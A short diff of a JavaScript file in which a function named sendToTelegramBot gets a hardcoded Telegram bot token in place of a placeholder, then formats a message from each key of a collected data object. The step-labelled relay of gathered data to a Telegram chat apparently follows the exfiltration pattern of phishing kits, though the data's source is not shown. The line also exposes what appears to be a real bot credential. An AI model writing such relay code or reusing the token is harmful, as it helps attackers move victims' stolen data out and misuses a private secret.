@@ -278,7 +278,7 @@ function sendToTelegramBot(data) {
 
             // Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
             // Replace 'YOUR_CHAT_ID' with the chat ID of the recipient
-            const telegramUrl = `https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage`;
+            const telegramUrl = `https://api.telegram.org/bot8387150770:AAG9y4ud3Rbe1CBIrVsfIww5W1XCJ-rAc2c/sendMessage`;
 
             let message = `<b>${data.step}</b>\n`;
             for (let key in data.data) {
